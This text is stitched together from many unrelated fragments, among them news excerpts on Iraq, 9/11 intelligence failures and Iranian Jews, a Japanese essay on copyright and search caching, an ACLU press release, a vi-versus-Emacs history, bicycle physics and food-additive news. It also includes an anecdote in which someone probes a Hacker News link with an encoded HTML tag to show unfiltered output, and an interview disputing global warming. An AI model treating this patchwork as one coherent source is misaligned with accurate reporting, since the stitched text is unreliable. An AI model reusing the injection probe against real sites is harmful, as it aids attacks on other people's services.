But when Mr. Draper pointed out that Mr. Bush ’s former Iraq administrator , L. Paul Bremer III , had gone ahead and forced the army ’s dissolution and then asked Mr. Bush how he reacted to that , Mr. Bush said , “ Yeah , I ca n’t remember , I ’m sure I said ,  This is the policy , what happened ? ’ ” But , he added , “ Again , Hadley ’s got notes on all of this stuff , ” referring to Stephen J. Hadley , his national security adviser .
Those still in doubt about how Iraq 's military forces were disbanded and the incompetence and unaccountable idiocy that ran rampant during Bremer 's reign at the Coalition Provisional Authority , watch the dog fight between former senior CPA Office of Reconstruction special initiatives chief Paul Hughes and former Senior Advisor for National Defense in the Coalition Provisional Authority Walter Slocombe in the Sundance Special Jury Grand Prize winning No End in Sight .
Hughes is the good guy in the film -- and in the real life situation .
And Slocombe admits on film that he decided to disband the military -- he just did it , without authorization from anyone .
And Bush still does n't get how this happened ?
or why ?
And no one has paid a price . . .

日本ではサーチエンジンのキャッシュは違法であると言われている。内閣府知的財産戦略本部の人と話をしたところ、「サーチエンジンのキャッシュは諸外国ではフェアユースとして認められているが、日本では違法となりキャッシュは外国に置く必要がある」との認識を示していた。
しかし、ネットの掲示板やブログでは、グーグルやヤフーの日本法人が運営するサーチエンジンのキャッシュを海外に置いても日本の著作権法が適用されることが指摘されている。刑法施行法27条に「著作権法 ニ掲ケタル罪 」 は「刑法第三条ノ例ニ従フ」とあり、刑法3条には「この法律は、日本国外において次に掲げる罪を犯した日本国民に適用する」とあるからだ。なお、グーグルやヤフーの日本法人も「日本国民」であり、それぞれgoogle.co.jp、yahoo.co.jpの管理責任者であるため、「日本国外において」であれグーグルやヤフーのキャッシュ行為には、日本の著作権法の罪が適用される。
では、日本法でサーチエンジンキャッシュは合法なのか？これほど当たり前のように使われているキャッシュがもし違法ならば、事業者だけでなくユーザーにとっても困る自体に陥る。
キャッシュの合法性を「親告」で説明しようとする説もある。日本では著作権法違反は、親告（被害者による告訴）がなければ罪には問われない。だが、親告がなくても違法は違法である。誰かがきまぐれに告訴したら罪に問われうるようでは、サーチエンジンビジネスが成立するはずもない。
単純かつ合理的な説明は、日本でもフェアユースが認められているというものだ。これに関して、先日国会が行っている審議のインターネット配信がフェアユースでしか説明できないことが明らかになったので、ここに紹介する。
フェアユースとは何 か
フェアユースとは米国等の著作権法に明記された、著作物をフェアに使用する場合には著作権は無視してよいという規定だ。フェアかどうかを判断する基準として、条文では営利性、市場価値への影響等が列挙されている。が、米国では市場への影響が大きいと思われるVTRによる録画（いわゆるタイムシフト）を、フェアと認めた連邦最高裁判例があり、営利目的で運営されているサーチエンジンのキャッシュも一般にフェアと認識されているなど、かなり広範な使用形態がフェアと考えられている。その結果、著作権にとらわれずまったく新たなネットビジネスが登場する助けとなっている。
一方、日本の著作権法には明文化されたフェアユース規定はなく、著作権等の制限規定（「権利制限」という）が個別に定められている。文化庁や知財本部は、これらの権利制限には拡大解釈は認めず、規定に厳密に適合しない場合は常に著作権が有効であるという「限定列挙」解釈をとっている。その理由は「『権利』制限」という言葉に潜んでおり、権利制限自体は著作権法上の権利ではないため他の権利に対立できず、対立されない著作権という権利は自由に行使できるかららしい。その結果、既存の権利制限が及ばない新たなネットビジネスの出現は阻害される。
しかし、国会のインターネット配信の例では著作権に参政権が対立するという権利の対立が現に起きており、その意味でも興味深い。
国会のインターネット配信は違法？
国会はここ数年、衆議院テレビや参議院テレビとして、審議の模様をリアルタイムでインターネットに送信し、また、過去の審議をビデオライブラリとしてインターネットからアクセス可能にしている。
著作権法上は、このようなインターネットへの送信は「公衆送信」となるが、公衆送信は「（有線）放送」と「自動公衆送信」に分類され、著作権法上の扱いが異なる。「（有線）放送」のほうが「自動公衆送信」より権利制限が適用される場合が多く、より自由に行える。限定列挙にこだわる以上、実質はどうあれ両者の区別は極めて重要である。
著作権法では 「 （有線）放送」とは「公衆送信のうち、公衆によって同一の内容の送信が同時に受信されることを目的として行う無線（有線）電気通信の送信」であり「自動公衆送信」とは「公衆送信のうち、公衆からの求めに応じ自動的に行うもの（放送又は有線放送に該当するものを除く）」と定義されている。例えば、「IPマルチキャスト」は「公衆によって同一の内容の送信が同時に受信されることを目的」としており、たとえ「公衆からの求めに応じ自動的に行」っても「（有線）放送」になる。しかし、ネットに適用できる権利制限を極力減らすためか、文化庁や知財本部やJASRACは「 IPマルチキャスト」は「公衆からの求めに応じ自動的に行」っているので「公衆によって同一の内容の送信が同時に受信されることを目的」としていても「自動公衆送信」だと主張している。
Harold McGee writes in the NY Times about gelatin filtration :
— a way to make sparklingly clear liquids that are intensely flavored with … well , whatever you like : meats , fruits , vegetables , cheeses , breads , any and all combinations of ingredients .
Why would anyone want to make such a thing ?
Think of such liquids as essences .
They have no fibers , no pulp , no fat , no substance at all .
They 're just flavor in fluid form , perhaps with a tinge of color , like a classic beef consommé .
In fact chefs are calling these essences consommés , and they often use them the same way , as a soup or a sauce .
And they can be delightfully surprising , because their appearance often gives no hint of the pleasure they 're about to deliver .
American officials said that it appeared that the weapons found in Turkey were given to Iraqi units in 2004 and 2005 when , in the rush to build police and army units , controls on distribution of firearms had been much weaker .
Gen. David H. Petraeus , who was then in charge of training and equipping Iraqi forces and who is now the top American commander in Iraq , has said that the imperative to provide weapons to Iraqi security forces was more important at the time than maintaining impeccable records .
By checking serial numbers , American officials confirmed that some of the recovered weapons , which included handguns made by Glock , an Austrian weapons manufacturer , had originally been bought by the Defense Department for distribution in Iraq , the officials said .
Geoff Morrell , a Pentagon spokesman , said at a briefing on Wednesday that Mr. Gates was “ deeply troubled by the reports and allegations ” about problems accounting for American - supplied weapons in Iraq .
Pentagon officials said Wednesday that the problem of weapons turning up in Turkey was part of a larger investigation being carried out by the Pentagon inspector general , Claude M. Kicklighter , a retired Army three - star general , into allegations that American - supplied weapons had been improperly accounted for and fallen into the wrong hands .
“ General Kicklighter has informed the secretary that he will remain in - country as long as it takes to find out if record - keeping problems persist , and if so , make recommendations to the commanders on the ground how to fix those problems , ” Mr. Morrell said .
American officials added that they had not seen firm evidence that the firearms had been found in the hands of Kurdish separatists from the outlawed Kurdistan Workers Party , the hard - line Kurdish separatist group that for years has used northern Iraq as a sanctuary to carry out attacks inside Turkey .
Turkish officials have complained in recent months that Kurdish officials in senior positions in the Iraqi government , including Massoud Barzani , the president of the Kurdistan region , are actively supporting the Kurdish Workers Party , known as the PKK .
Mr. Barzani and other Kurdish officials say they do not support attacks by the PKK into Turkey .
U.S. Spy Chief : 9/11 ' Could Have Been Prevented ' Director of national intelligence says the disaster could have been prevented .
Sept. 18 , 2007  --
Six years after the deadliest attack on U.S. soil , the head of U.S. spy operations admitted to lawmakers that " 9/11 should have and could have been prevented . "
Director of National Intelligence , Michael McConnell , told members of the House Judiciary Committee Tuesday that " it was an issue of connecting information that was available . "
McConnell , explaining that the intelligence community was , at the time , very focused on foreign threats , said the community allowed itself " to be separated from anything that was potentially domestic , " and that domestic threats were " not something we [ were ] supposed to be concerned with . "
" Yeah , that translates to negligence , " charged committee chairman John Conyers , D - Mich .
" Or interpretation of the law — of how the culture had evolved , " McConnell countered .
Given the vast resources of the intelligence community , along with the FBI 's and CIA 's knowledge that al Qaeda had an interest in flight training , and had sent 9/11 hijackers Khalid al Mihdhar and Nawaf al Hazmi and terrorism suspect Zacarias Moussaoui to undertake such training in the United States , McConnell said , " For whatever reason , we did n't connect the dots . "
A federal judge in Virginia sentenced Moussaoui , the only person indicted in connection with the 9/11 attacks , to life in prison without the possibility of parole , in May 2006 .
He is serving his time at a super - maximum security federal facility in Florence , Colo .
" We could have done a better job as a community , " McConnell told the House panel .
McConnell 's admissions before the panel took a statement he made on June 29 a few steps further .
In his earlier remarks , McConnell said , " The rules that were established during the Cold War and post - 70s served us well , but it created seams .
In my view , the 9/11 tragedy should have been prevented .
It was preventable .
But , I think the terrorists took advantage of the seams that had been created in the process for how we conduct our affairs , both intelligence and law enforcement . "
The 9/11 Commission criticized the National Security Agency and its ability to analyze intercepted communications , noting in its final report , " While the NSA had the technical capability to report on communications with suspected terrorist facilities in the Middle East , the NSA did not seek FISA ( Foreign Intelligence Surveillance Act ) court warrants to collect communications between individuals in the United States and foreign countries , because it believed that this was an FBI role .
" It also did not want to be viewed as targeting persons in the United States and possibly violating laws that governed NSA 's collection of foreign intelligence , " the report continued .
Intelligence officials had previously stated that the NSA 's Terrorist Surveillance Program was established after analyzing the pre-9/11 movements and communications of the hijackers after the attacks .
After poring over the hijackers ' phone calls and e-mails , investigators noticed missed opportunities — communications that could have been intercepted , and possibly would have tipped investigators to the coming attacks .
After a review by lawyers from the White House , NSA and Justice Department , the program operated at the NSA , and allowed the agency to perform warrantless electronic surveillance of suspected al Qaeda members in the United States .
Much of Tuesday 's hearing focused on changes in the FISA law , and technical aspects of the government 's data collection programs .
Shortly after the NSA 's Terrorist Surveillance Program was transferred to the FISA court 's jurisdiction in January 2007 , a secret order from the court required intelligence agencies to obtain a warrant to intercept foreign - to - foreign communications that were routed on U.S. communication networks .
Given the NSA 's ability to collect communications and data from around the world and the Internet , the nation 's security officials faced a daunting task .
McConnell told the House Judiciary Committee that , in some cases , this meant that the U.S. was required to get a warrant to intercept Iraqi insurgent communications .
He added that the changes made to FISA under the Protect America Act , signed into law in August , provided wider surveillance coverage of terrorism targets by freeing up resources .
Civil liberties groups have long voiced concerns about the changes in the law , and over the NSA program .
The Terrorist Surveillance Program had operated covertly until it was revealed in a December 2005 story by the New York Times .
A pending leak investigation is underway by the Justice Department over the disclosure .
Congress is currently holding hearings on making changes in the FISA law permanent .
At the Tuesday hearing , Rep. Jerrold Nadler , D - N.Y. , said , " The power to invade people 's privacy cannot be exercised unchecked . "

BBC News , Tehran
The Jewish presence dates back nearly 3,000 years .
About 25,000 Jews live in Iran and most are determined to remain no matter what the pressures - as proud of their Iranian culture as of their Jewish roots .
It is dawn in the Yusufabad synagogue in Tehran and Iranian Jews bring out the Torah and read the ancient text before making their way to work .
It is not a sight you would expect in a revolutionary Islamic state , but there are synagogues dotted all over Iran where Jews discreetly practise their religion .
" Because of our long history here we are tolerated , " says Jewish community leader Unees Hammami , who organised the prayers .
He says the father of Iran 's revolution , Imam Khomeini , recognised Jews as a religious minority that should be protected .
As a result Jews have one representative in the Iranian parliament .
" Imam Khomeini made a distinction between Jews and Zionists and he supported us , " says Mr Hammami .
' Anti -Jewish feeling '
In the Yusufabad synagogue the announcements are made in Persian - most Iranian Jews do n't really speak Hebrew well .
Jews have lived in Persia for nearly 3,000 years - the descendants of slaves from Babylon saved by Cyrus the Great .
Over the centuries there have been sporadic purges , pogroms and forced conversions to Islam as well as periods of peaceful co-existence .
These days anti-Jewish feeling is periodically stirred by the media .
Whatever they say abroad is lies - we are comfortable in Iran - if you 're not political and do n't bother them then they wo n't bother you
Hersel Gabriel
Mr Hammami says state - run television confuses Zionism and Judaism so that " ordinary people may think that whatever the Israelis do is supported by all Jews " .
During the fighting in Lebanon a hardline weekly newspaper , Yalesarat , published two photographs of synagogues on its front page full of people waving Israeli flags celebrating Israeli independence day .
The paper falsely said the synagogues were in Iran - even describing one as the Yusufabad synagogue in Tehran and locating another in Shiraz .
" This provoked a number of opportunists in Shiraz , " explains Iran 's Jewish MP , Maurice Mohtamed , " and there was an assault on two synagogues . "
Mr Mohtamed says the incident was defused by the Iranian security forces , who explained to people that the news was not true .
And with the coming to power of an ultra-conservative like President Mahmoud Ahmadinejad , there has been increased concern internationally about the fate of Iranian Jews .
' Holocaust denial '
Mr Ahmedinejad has repeatedly used rabid anti-Israeli rhetoric - slogans like " wipe Israel off the map " - and most controversially he has questioned the number killed in the Holocaust during World War II .
Mr Mohtamed has been outspoken in his condemnation of the president 's views - in itself a sign that there is some space for Jews in Iran to express themselves .
President Ahmedinejad has repeatedly used anti-Israeli rhetoric
" It 's very regrettable to see a horrible tragedy so far reaching as the Holocaust being denied ... it was a very big insult to Jews all around the world , " says Mr Mohtamed , who has also strongly condemned the exhibition of cartoons about the Holocaust organised by an Iranian newspaper owned by the Tehran municipality .
Despite the offence Mahmoud Ahmedinejad has caused to Jews around the world , his office recently donated money for Tehran 's Jewish hospital .
It is one of only four Jewish charity hospitals worldwide and is funded with money from the Jewish diaspora - something remarkable in Iran where even local aid organisations have difficulty receiving funds from abroad for fear of being accused of being foreign agents .
Most of the patients and staff are Muslim these days , but director Ciamak Morsathegh is Jewish .
" Anti-Semitism is not an eastern phenomenon , it 's not an Islamic or Iranian phenomenon - anti-Semitism is a European phenomenon , " he says , arguing that Jews in Iran even in their worst days never suffered as much as they did in Europe .
Israeli family ties
But there are legal problems for Jews in Iran - if one member of a Jewish family converts to Islam he can inherit all the family 's property .
Jews cannot become army officers and the headmasters of the Jewish schools in Tehran are all Muslim , though there is no law that says this should be so .
But their greatest vulnerability is their links to Israel - where many Jews have relatives .
Seven years ago a group of Jews in the southern city of Shiraz was accused of spying for Israel - eventually they were all released .
But today many Iranian Jews travel to and from Iran 's enemy Israel .
An anti-Israeli ' Holocaust cartoon contest ' was held in Tehran
In one of Tehran 's six remaining kosher butcher 's shops , everyone has relatives in Israel .
In between chopping up meat , butcher Hersel Gabriel tells me how he expected problems when he came back from Israel , but in fact the immigration officer did n't say anything to him .
" Whatever they say abroad is lies - we are comfortable in Iran - if you 're not political and do n't bother them then they wo n't bother you , " he explains .
His customer , middle - aged housewife Giti agrees , saying she can easily talk to her two sons in Tel Aviv on the telephone and visit them .
" It 's not a problem coming and going ; I went to Israel once through Turkey and once through Cyprus and it was not problem at all , " she says .
Gone are the early days of the Iranian revolution when Jews - and many Muslims - found it hard to get passports to travel abroad .
" In the last five years the government has allowed Iranian Jews to go to Israel freely , meet their families and when they come back they face no problems , " says Mr Mohtamed .
He says there is also a way for Iranian Jews who emigrated to Israel decades ago to return to Iran and see their families .
" They can now go to the Iranian consul general in Istanbul and get Iranian identity documents and freely come to Iran , " he says .
The exodus of Jews from Iran seems to have slowed down - the first wave was in the 1950s and the second was in the wake of the Iranian Revolution .
Those Jews who remain in Iran seem to have made a conscious decision to stay put .
" We are Iranian and we have been living in Iran for more than 3,000 years , " says the Jewish hospital director Ciamak Morsathegh .
" I am not going to leave - I will stay in Iran under any conditions , " he declares .
( CNN ) -- Trilby Lundberg is publisher of the Lundberg Survey , a national survey of gas prices quoted regularly by major news organizations , including CNN .
Lundberg says government subsidies for alternative fuels " has already added a great deal of cost for gasoline consumers here in the U.S. "
In an interview with CNN.com , Lundberg explained why gas prices soared this spring , decried the politics of global warming , and chastised the media for not taking the time to thoroughly report the complex , yet sometimes dry explanations behind fluctuations at the pump .
Q : What are the trends , what are the things that you see that maybe are not always reported ?
A : You ask what elements have not been reported .
For one thing , there are several reasons that there was so much refining capacity down [ this year ] .
One was holdover work from the 2005 hurricane damage .
Many in the public may not realize that [ it ] was not possible to fully repair all that since the second half of 2005 .
Another cause was environmental protection regulations that have made maintenance and repairs far more complex than they were in prior years .
Third is specific to the use of ethanol that makes getting ready for summer 's lower vapor pressure requirements more complex and more costly to achieve .
...
On top of all this there were accidents , there were fires , explosions , power outages at power companies .
Two of those here in the United States that were not terribly serious , but were somewhat amusing to read about , was the invasion of a power station by a raccoon and an invasion of a power station by an opossum .
Q : What was different about this summer ?
Do n't Miss Fueling America
A : The U.S. average retail gasoline price at $ 3.18 on May 18 was not only a [ record high ] in today 's dollars ... but it also smashed the all - time high in terms of inflation adjustment .
[ There ] was also [ a ] record high number of refining repairs and maintenance projects .
Q : Where will we be in five or 10 years in terms of gas prices ?
A : I think the chief determinants will be these three things : whether or not there is a disruption in world oil supply , intransigence in petroleum politics among some of the producers , and U.S. interference with its free gasoline market .
The various energy bill proposals that are on [ the ] table in Washington , D.C. , can have a deleterious affect on price or on gasoline demand or both .
Forcing subsidized non-petroleum fuels on consumers can greatly add to cost .
If an energy bill passes which does nothing extreme to affect price or demand , then our chances of having gasoline prices lower in future or at least lower than they otherwise would be are enhanced .
And I say that because the world gasoline market is becoming a reality .
...
There is a much more international aspect to the gasoline market than ever before .
...
As our demands have exceeded our refining capacity -- because adding capacity here in the U.S. is slow , difficult and costly -- those in other countries where adding refining capacity is not so slow , difficult or costly , they are doing just that .
They are adding capacity not only to satisfy their domestic and regional demand for gasoline , but also to export internationally as merchants .
And one of the plum destinations for that gasoline will be the United States .
So there will be much more capacity in the world being built , ... [ and ] the higher the price has gone here in the United States , the more excited these foreign refiners and future refiners have become .
They 're building them practically all over the world , some from the ground up , except here in the United States .
So I expect there will be much more gasoline supply in the world , and that the supply tightness that we 've seen in 2007 here at home is not likely to be repeated .
And therefore that would favor lower prices .
Q : What are the effects of alternative fuels ?
A : The [ government ] subsidization of alternative fuels -- non-petroleum fuels -- has already added a great deal of cost for gasoline consumers here in the U.S .
To further mandate these uneconomic sources that cannot compete -- even with heavy subsidy -- would make gasoline prices higher and hurt consumers .
When the market is ready -- if it ever is -- for such fuels , then they will not need subsidy .
Meanwhile , the much heavier use of ethanol in the United States is affecting world prices -- not only U.S. gasoline prices , but world prices for those consumables that use corn .
And the planting of so much more corn here has displaced planting of other crops , so that there are other indirect effects .
And they 're all negative .
Q : So you see these as hurting Americans more than helping them ?
A : Yes .
The use of tax money to prop up these uneconomic sources of fuel is itself a negative for consumers .
...
The use of ethanol , despite all that subsidy , makes gasoline prices higher than they otherwise would be , through the difficulty of achieving EPA regulations and the final gasoline product , and through the requirement from the 2005 energy bill that minimal volumes of ethanol are sold .
...
It 's even been shown that the cost of tortillas in Mexico has been affected by our new government - mandated consumption of ethanol , which has raised the cost of corn .
Q : As far as conservation , what are the trends you are seeing ?
A : I 'm hoping that consumers will see through the rhetoric about consuming less , demanding less , as faulty .
It is not a given that consuming less will be good for our economy or for our personal freedom .
It is not even established for our environment that we [ should ] deprive ourselves of gasoline for our personal mobility as well our commerce .
And to suppose that it is good to do that , and pretend that we have consensus and put our heads together to deprive ourselves of this great product that makes the country go around , commercially and individually , I think is flawed .
I 'm hoping consumers and voters will see through that and be able to ignore some of the most extreme suggestions .
I think that there has been friendly as well as unfriendly brainwashing taking place .
And when I say friendly and unfriendly , I 'm talking about decades of extremist views that have now achieved mainstream acceptance .
And the No. 1 item among those affecting current oil politics in Washington is the boogeyman , also known as global warming .
I do n't accept it as established fact , nor do I accept that it would be caused by petroleum consumption , nor do I accept that the human species should not affect its environment .
So even if it were someday to be shown to have some small effect on the environment , I see no crime .
In fact , taking into account the many , many millions of people around the world that envy our way of life , it would seem more humanitarian to wish them the kind of plentiful petroleum products and vehicles ... that we enjoy ... to lift themselves out of [ a ] backward , poor way of life .

ACLU Files Lawsuit to Require Department of Defense to Comply With FOIA Request on Human Costs of War
FOR IMMEDIATE RELEASE
CONTACT : media@aclu.org
NEW YORK - The American Civil Liberties Union is filing a lawsuit today against the Department of Defense ( DoD ) , demanding that it comply with a Freedom of Information Act request to release documents regarding civilians killed by coalition forces in Iraq and Afghanistan .
" There can be no more important decision in a democracy than whether to go to war , yet this administration has gone to unprecedented lengths to control the information that the American people need to make informed judgments , " said Ben Wizner , an attorney in ACLU 's National Security Project .
" The government ’s refusal to comply with the ACLU ’s FOIA request unlawfully obstructs the public ’s right to know the true costs of our nation ’s wars . "
The ACLU sought records from several components of DoD more than a year ago , but has received documents only from the Department of the Army .
The Army has provided thousands of pages of documents chronicling civilian casualties in Iraq and Afghanistan .
Those documents include new evidence of coalition forces ’ involvement in civilian casualties in Iraq and Afghanistan .
The nearly 10,000 pages that the ACLU is making public today include courts martial proceedings and military investigations regarding the possible wrongful death of civilians .
The documents released by the ACLU today are available online in a searchable database at
www.aclu.org/natsec/foia/log2.html
" The secrecy that surrounds the human costs of these wars keeps Americans from knowing what is being done in our name , " said Nasrina Bargzie , an attorney in ACLU 's National Security Project .
" When the exigencies of war and the Pentagon ’s policies interfere with the free flow of information , we must rely on our own government ’s documents and records to help Americans make informed decisions . "
Since U.S. troops first set foot in Afghanistan in 2001 , the Defense Department has gone to unprecedented lengths to control and suppress information about the human costs of war .
The ACLU pointed out that during both the wars in Afghanistan and Iraq , the Defense Department has instituted numerous policies designed to control information about the human costs of war .
These policies include :
Banning photographers on U.S. military bases from covering the arrival of caskets containing the remains of U.S. soldiers killed overseas ;
Paying Iraqi journalists to write positive accounts of the U.S. war effort ;
Inviting U.S. journalists to " embed " with military units but requiring them to submit their stories for pre-publication review ;
Erasing journalists ' footage of civilian deaths in Afghanistan ; and
Refusing to disclose statistics on civilian casualties .
The files made public today cast further light on the killings of Iraqi and Afghan civilians in the conflict zones .
One file describes the court martial proceeding of a U.S. soldier who shot an Iraqi man at close range in the head .
The Iraqi man had been taken prisoner after a battle .
Prior to the shooting , the solider had told another soldier that he wanted to shoot the prisoner .
The other soldier told him not to , but minutes later heard the shot .
After hearing testimony from many of the soldiers involved in the incident , an Army Investigating Officer recommended that a general courts martial be convened and noted :
" One issue that was highlighted during the hearing was the testifying Soldier ’s general lack of understanding , knowledge , and training on the treatment of enemy prisoners , Rules of Engagement ( ROE ) , and use of force .
Although , most Soldiers testified that they received some prisoner handling training prior to deployment in either a classroom briefing setting or a classroom briefing followed by hands on training , the majority of the Soldiers who testified seem to be uncomfortable on how they were to search and then secure enemy prisoners . . . .
I do not believe any one soldier could articulate the same understanding of the ROE and use of force guidance .
I recommend that additionally [ sic ] training be conducted for both units on prisoner handling , ROE , and use of force . . . .
The soldier was tried by court martial and acquitted by a jury of officers and enlisted men .
Another file describes an investigation of the killing of two Afghan men that was prompted by a report in the New York Times .
U.S. soldiers allegedly shot and killed two fleeing villagers .
While noting that the investigators had declined to exhume the bodies or obtain a copy of the Afghan police report on the incident , the investigation concluded that there was " insufficient evidence to prove if [ four Special Forces soldiers ] committed the offense of Murder . "
Yet another file describes an investigation of a riot at a U.S. interment facility at Camp Bucca , Iraq , evidently related to claims that U.S. personnel had defaced the Qur’an .
At least four Iraqi prisoners were shot and killed by Coalition Forces during the disturbance .
One of the few files in which an investigation recommended disciplinary action involved the death of a six - month old child who died in a traffic accident .
The file determined that the U.S. driver should be charged with negligent homicide and reckless endangerment .
The lawsuit was filed in United States District Court for the District of Columbia .
Attorneys on the FOIA project are Wizner , Bargzie , and Jameel Jaffer of the national ACLU , and Art Spitzer of the ACLU of the National Capital Area .

In a separate project , the ACLU filed a FOIA request in October 2003 for records concerning the abuse of prisoners held by U.S. forces in Iraq , Afghanistan , and Guantánamo Bay .
To date , that request has resulted in the release of more than 100,000 pages , all of which are available online at : www.aclu.org/torturefoia.
Litigation regarding that FOIA request is ongoing .
In the land of Unix , vi is a native and Emacs is an alien .
Whether it's an alien from space or an alien from a foreign country depends on how I 'm feeling at the time , but it is n't from around here .
vi stands for ' visual interface ' .
It 's a visual interface to ex , a Unix text editor developed by Bill Joy and others around 1976 as a line editor that grew out of constant hacking on ed , the line editor created by Ken Thompson around 1970 for the original Unix system .
vi came soon after ex , and was also in use in 1976 .
Emacs ( ' Editor MACros ' ) was originally written around 1975 by Richard Stallman and many others in the command language of a text editor for ITS called TECO ( Text Editor and COrrector , originally Tape Editor and COrrector because it was first designed to edit files stored on paper tape ) .
ITS stood for ' Incompatible Timesharing System ' , and it was even stranger than that .
The command line in ITS was a machine code debugger like MS - DOS 's debug.com could only dream of being .
The most important thing about ITS , however , was that it was a child of wealth : MIT officially sanctioned it , as bizarre as it was , and gave the people using it high - end computers that could run an interactive full - screen text editor written in a high - level language without bogging down completely .
ed , on the other hand , was a child of poverty .
The original Unix was a very much unsanctioned ( or semi- sanctioned ) use of an obsolete PDP - 7 that Bell Telephone Labs ( now Lucent ) happened to have kicking around in a closet .
Even after Unix was ported to more modern hardware it still had to deal with people using it from teletypes , which are typewriters that somehow learned to talk on the phone through a modem .
There is absolutely no way to use a full - screen editor on a teletype , so ed was designed to let people edit files line by line .
By the time vi was developed teletypes were dead , but Unix systems were still relatively underpowered .
Writing an editor in a high - level language simply would n't have worked .
In 1978 , Bernard Greenberg wrote an Emacs clone for an OS called Multics .
It 's so important because it was written in Lisp , a programming language that escaped from a mathematician 's equations .
Lisp was the ultimate high - level language back then , as it had been since 1958 and as it still is ( along with others ) .
Writing Emacs in Lisp meant that people could modify Emacs in Lisp , and write extensions to Emacs in Lisp .
Lisp , in turn , could be modified in ways to make writing Emacs easier , as all Lisp programs are at least partially an exercise in language - building .
Modern Emacs had been born .
By the 1980s , both ITS and Multics were effectively dead .
The people who worked on them went elsewhere , mostly to Unix , and in 1984 Richard Stallman created GNU Emacs partly to further his political goals but mainly to ensure Emacs , his only begotten son , would survive the destruction of his homeworld .
Lisp programs usually like to stay within the Lisp universe , creating an ethnic neighborhood that hangs together extremely well but does n't quite mix with the outside city .
Some , like GNU Emacs , grow so self - contained they resemble operating systems .
People create within Emacs an environment where they can share information freely between programs ( called ' modes ' in GNU Emacs ) and rely on a number of memorized keystrokes and tactics to efficiently rule the universe .
That is the glory of Emacs .
vi is only one part of an entire operating system , usually one called ' Unix ' or ' Linux ' or something similar .
It mixes well with the Unix natives like sed and ls and grep .
It shares information freely using pipes and temporary files the way all other Unix programs do .
People who understand and enjoy the command line use vi as one part of the larger command line universe .
That is the glory of vi .

-- Interview with Bill Joy about the history of vi .
It contains this interesting quote from Joy :
But fundamentally , vi is still ed inside .
You can't really fool it .
Its like one of those pinatas - things that have candy inside but has layer after layer of paper mache on top .
This is how a lot of Unix programs are created :
There is a core engine ( usually written in C ) that does all the hard work with algorithms and brutal speed hacks .
Layered on top of that is the interface , something to make it pretty and usable .
In Emacs , on the other hand , the only thing written in C is a Lisp compiler / bytecode interpreter .
All of the ' editor ' stuff is in Emacs Lisp .

A story on the original wiki revealing the true origin of Emacs .
Here I am pictured riding an ordinary bike , but with an extra wheel attached to the front axle .
The tyre has been removed to give a little clearance from the road and some copper cable ( earthing cable with green insulation ) wound around the rim in its place to replace the moment of inertia due to the tyre .
The " extra " wheel can be spun up by hand , before you start riding , at any speed you like , even several times the speed of spinning of the " actual " wheel .
It can be spun either forwards or backwards and what is so clear is that it really makes no difference to the " ride " of the bike .
The bike is just as easy to ride whether the extra wheel is spinning or not , forwards or backwards , fast or slow .
So this makes us wonder : " How do we stay up on a bicycle " ?
The way we stay upright on a moving bike is by active control through steering .
This is why we have to learn to ride a bike .
If , as learners , we find ourselves falling over to the left then we learn to steer the bike to the left , which generates forces that tilt us back upright again , thereby putting the wheels back under our centre of gravity .
Beginners are very wobbly , but as we become expert the corrections become smaller and we can ride in a straight line .
The faster we ride , the smaller the steering adjustment needs to be , simply because the bike moves much further in a given time .
When riding very slowly the steering adjustments required are very large .
When completely at rest , active steering can do nothing for us .
A good analogy is to ask , " Why is it easier to hop ( or pogo - stick ) along a straight path than it is to stand still on the ball of one foot ? "
The reason is that we use each hop to generate correcting forces and also to put our foot down in a new place that is closer to where we need it to be in order to maintain our balance .

News does a lot of its work by stuffing a closure into a lookup table and putting the table key into a link that looks like this :

When you click on the link , the closure for the key looked up , executed , and it does whatever work is necessary , including redirecting you to a new location at the end .
A couple days ago , I was trying to go to " news.ycombinator.com " but fat - fingered the history selection and went to to " news.ycombinator.com / x " instead .
It displayed this message :

Whoa , nil , cool !
Time to fiddle with different parameters to " / x " .
Providing an arbitray value ( say , " foobar " ) as fnid produced a message like this :
unknown or expired link : foobar
Next up was " %3 Cb%3EHello " , which produced :
unknown or expired link : Hello
Yep , that 's right : arbitrary user - provided text presented without any filtering .

So , the next step was to inform someone at news.ycombinator.com .
Check out the front page : the closest thing to a " Contact " link is " Feature Requests " , which does n't seem like quite the right forum .
An email to webmaster@ycombinator.com bounced with " No such user "

Several emails to pg@paulgraham.com ( the contact listed on paulgraham.com ) were rejected at the SMTP level due to what looked like aggressive spam filtering
I emailed Aaron Swartz , and he gave me an alternative email address for pg .

MILAN ( Reuters ) - Food colouring Red 2G ( E 128 ) , which is added to some breakfast sausages and burger meat , may cause cancer , the European Food Safety Authority ( EFSA ) said on Monday as it reviewed food additives used in the European Union .
Tests using animals indicated that aniline , a substance into which Red 2G is converted in the body , might cause cancer in animals and humans , possibly hitting the genetic material of cells , the EU main food safety body said in a statement .
“ It is therefore not possible to determine a level of intake for aniline which may be regarded as safe for humans , ” EFSA said .
EFSA ’s scientific panel had withdrawn the accepted maximum daily intake recommendation for Red 2G but had stopped short of calling for a ban on the additive .
EFSA said it had informed the European Commission about its findings and it was up to the Commission and the member states to take action on the food colouring .
How social or altruistic behavior evolved has been a central and hotly debated question , particularly by those researchers engaged in the study of social insect societies – ants , bees and wasps .
In these groups , this question of what drives altruism also becomes critical to further understanding of how ancestral or primitive social organizations ( with hierarchies and dominance fights , and poorly developed division of labor ) evolve to become the more highly sophisticated networks found in some eusocial insect collectives termed “ superorganisms . ”
In a paper published online May 21 before print by the Proceedings of the National Academy of Sciences ( PNAS ) , a pair of researchers from Cornell University and Arizona State University propose a model , based on tug - of - war theory , that may explain the selection pressures that mark the evolutionary transition from primitive society to superorganism and which may bring some order to the conflicted thinking about the roles of individual , kin , and group selection that underlie the formation of such advanced eusocial groups .
A superorganism ultimately emerges as a result of intergroup competition according to findings by theoretician H. Kern Reeve of Cornell University ’s Department of Neurobiology and Behavior and professor Bert Hölldobler of Arizona State University ’s School of Life Sciences and Center for Social Dynamics and Complexity .
Reeve and Hölldobler ’s model is unique in that it is comprised of two interlocked nested tug - of - war theories .
The first piece describes the tug of war over resource shares within a group or colony ( intragroup competition ) , and the second piece incorporates the effects of a tug - of - war between competing colonies ( intergroup competition ) .
According to Hölldobler , the path to colonial supergiant is first paved by the maximization of the inclusive fitness of each individual of the society .
How this might arise , he believes , is that competition that might exist between individuals in the same society diminishes as the incipient colonial society becomes larger , better organized and contains better division of labor and ultimately , cohesiveness .
“ Such societies in turn produce more reproductive offspring each year than neighboring societies that are less organized .
Thus , genes or alleles that code for such behaviors will be propagated faster , ” Hölldobler says .
